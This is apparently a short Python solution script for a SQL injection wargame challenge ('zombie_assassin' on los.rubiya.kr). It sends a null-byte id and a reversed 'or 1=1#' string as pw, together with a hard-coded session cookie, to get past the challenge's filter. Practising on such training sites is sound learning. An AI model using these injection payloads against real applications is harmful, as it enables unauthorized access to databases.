import requests

cookies = {"PHPSESSID": "hnqqnd0kksjcna51oknp9s2b4s"}

url = "https://los.rubiya.kr/chall/zombie_assassin_eac7521e07fe5f298301a44b61ffeec0.php"

params = {"id": "\0", "pw": "#1=1 ro "}
# id='' and pw=''

r = requests.get(url, params=params, cookies=cookies)
print(r.text)